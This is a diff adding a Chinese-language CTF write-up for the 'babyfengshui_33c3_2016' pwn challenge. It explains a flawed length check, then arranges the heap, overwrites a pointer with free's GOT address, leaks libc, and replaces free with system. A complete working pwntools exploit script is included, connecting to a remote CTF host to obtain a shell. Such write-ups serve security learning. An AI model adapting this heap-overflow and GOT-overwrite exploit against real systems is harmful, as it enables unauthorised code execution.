@@ -572,3 +572,106 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### babyfengshui_33c3_2016
+
+[题目链接](https://buuoj.cn/challenges#babyfengshui_33c3_2016)
+
+依旧是申请两个块看看，发现是 user_chunk + manage_chunk 的模式，manage_chunk 在其后，依次放着 manage_chunk_size，user_chunk_user_data 的起始地址，申请时填入的 name，且 manage_chunk 固定大小为 0x89。
+
+简单看一下 ida，Delete 函数里有 `*(&ptr + n0x31) = 0;`，uaf 被毙了。
+
+Add 函数里有 `sub_80486BB((char *)*(&ptr + (unsigned __int8)n0x31) + 4, 124);` 大概意思好像是输入 name 长度最大为 124，堆溢出被毙了
+
+updata 函数里也有检查输入长度不超过chunk本身长度的，堆溢出被毙了。
+
+但是仔细看这个 update 的检查机制，发现 `(char *)(v3 + *(_DWORD *)*(&ptr + n0x31)) >= (char *)*(&ptr + n0x31) - 4` 就是 `输入的长度+user_chunk_user_data 的起始地址` >= `manage_chunk 的起始地址` 时退出。
+
+那么我们可以考虑让 user_chunk 和 manage_chunk 离得远一点，形成一个
+
+两面包夹芝士！
+
+如何实现也很简单，既然先申请 user_chunk，那么 bins 放好 user_chunk 那么大的内存，后申请的 manage_chunk 就在 Top_chunk 切一块。
+
+这样我们就想怎么溢出怎么溢出了，这道题的打印函数和修改函数还都很齐全，所以下面的思路就比较平凡：
+
+通过 chunk_1 堆溢出修改 manage_chunk_2 里存放的 user_chunk_2_user_data 的起始地址，改成 free_got，然后用 display 函数打印出 free 的真实地址，这样我就可以 ret2libc，然后用 update 函数把 free_got 覆写成 system。
+
+（PS：我不知道为什么我把 free 覆写成 system 之后不论如何都不能再 Add 了，并且因为某些 fgets 的原因调试了很久，那个 name 是固定 `fgets(124)`，必须用 sendline，但是那个 text 我们最好还是用 send，因为一个神秘换行符调试了很久，haha 我真菜吧，挫败感十足啊。）
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27449
+io = remote(host,port)
+# io = process("./babyfengshui_33c3_2016")
+elf = ELF("./babyfengshui_33c3_2016")
+libc = ELF("./libc-2.23.so")
+free_got = elf.got['free']
+
+def Add(description_size,name,text_length,text):
+    io.recvuntil(b"Action: ")
+    io.sendline(b'0')
+    io.recvuntil(b"size of description: ")
+    io.sendline(str(description_size).encode())
+    io.recvuntil(b"name: ")
+    io.sendline(name)
+    io.recvuntil(b"text length: ")
+    io.sendline(str(text_length).encode())
+    io.recvuntil(b"text: ")
+    io.send(text)
+
+def Delete(index):
+    io.recvuntil(b"Action: ")
+    io.sendline(b'1')
+    io.recvuntil(b"index: ")
+    io.sendline(str(index).encode())
+
+def Display(index):
+    io.recvuntil(b"Action: ")
+    io.sendline(b'2')
+    io.recvuntil(b"index: ")
+    io.sendline(str(index).encode())
+    
+def Update(index,text_length,text):
+    io.recvuntil(b"Action: ")
+    io.sendline(b'3')
+    io.recvuntil(b"index: ")
+    io.sendline(str(index).encode())
+    io.recvuntil(b"text length: ")
+    io.sendline(str(text_length).encode())
+    io.recvuntil(b"text: ")
+    io.send(text)
+
+
+def main():
+    Add(0x78,b'A'*0x77,0x78,b'B'*0x78) # index 0
+    Add(0x78,b'C'*0x77,0x78,b'D'*0x78) # index 1
+    Add(0x78,b'E'*0x77,0x78,b'F'*0x78) # index 2 for guard
+    # gdb.attach(io)
+    Delete(1)
+    Add(0x100,b'G'*0xFF,0x100,b'H'*0x100) # index 3 for index 1 reborn and manage_chunk come from TOP_chunk
+    payload_0 = b"/bin/sh\x00" + b'I'*0xF4 + p32(0x80) + p32(0x100) + p32(0x81) + b'J'*0x78 + p32(0) + p32(0x89) + p32(free_got)
+    Update(3,len(payload_0),payload_0)
+    # gdb.attach(io)
+    Display(2)
+    io.recvuntil(b"description: ")
+    leak_data = io.recvn(4)
+    free_addr = u32(leak_data)
+    print("\n[+] Leak free address :",hex(free_addr))
+    libc_base = free_addr - libc.sym['free']
+    print("\n[+] Leak Libc base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n[+] Leak system address :",hex(system))
+    Update(2,4,p32(system))
+    # gdb.attach(io)
+    Delete(3)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
